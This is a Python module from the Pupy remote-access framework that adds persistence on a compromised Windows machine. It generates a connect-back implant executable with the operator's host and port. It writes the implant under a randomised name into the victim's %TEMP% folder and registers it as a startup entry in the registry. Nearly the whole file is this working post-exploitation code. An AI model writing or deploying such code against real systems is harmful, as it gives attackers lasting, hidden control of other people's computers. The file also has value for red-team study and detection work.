# -*- coding: UTF8 -*-
# --------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
# 
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
# 
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
# 
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
# 
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
# --------------------------------------------------------------
from pupylib.PupyModule import *
from pupylib.PupyCompleter import *
import random
import pupygen
import os.path
import string

__class_name__="PersistenceModule"

class PersistenceModule(PupyModule):
	""" Enables persistence via registry keys """
	def init_argparse(self):
		self.arg_parser = PupyArgumentParser(prog="persistence", description=self.__doc__)
		self.arg_parser.add_argument('-e','--exe', help='Use an alternative file and set persistency', completer=path_completer)
		self.arg_parser.add_argument('-m','--method', choices=['registry'], required=True, help='persistence method')

	@windows_only
	def is_compatible(self):
		pass

	def run(self, args):
		exebuff=b""
		if args.exe:
			with open(args.exe,'rb') as f:
				exebuff=f.read()
			self.info("loading %s ..."%args.exe)
		else:
			#retrieving conn info
			res=self.client.conn.modules['pupy'].get_connect_back_host()
			host, port=res.rsplit(':',1)
			#generating exe
			self.info("generating exe ...")
			if self.client.desc['proc_arch']=="64bit":
				exebuff=pupygen.get_edit_pupyx64_exe(host, port)
			else:
				exebuff=pupygen.get_edit_pupyx86_exe(host, port)
		if args.method=="registry":
			self.client.load_package("pupwinutils.persistence")



			remote_path=self.client.conn.modules['os.path'].expandvars("%TEMP%\\{}.exe".format(''.join([random.choice(string.ascii_lowercase) for x in range(0,random.randint(6,12))])))
			self.info("uploading to %s ..."%remote_path)
			#uploading
			rf=self.client.conn.builtin.open(remote_path, "wb")
			chunk_size=16000
			pos=0
			while True:
				buf=exebuff[pos:pos+chunk_size]
				if not buf:
					break
				rf.write(buf)
				pos+=chunk_size
			rf.close()
			self.success("upload successful")

			#adding persistency
			self.info("adding to registry ...")
			self.client.conn.modules['pupwinutils.persistence'].add_registry_startup(remote_path)
			self.info("registry key added")

			self.success("persistence added !")
		else:
			self.error("method not implemented")

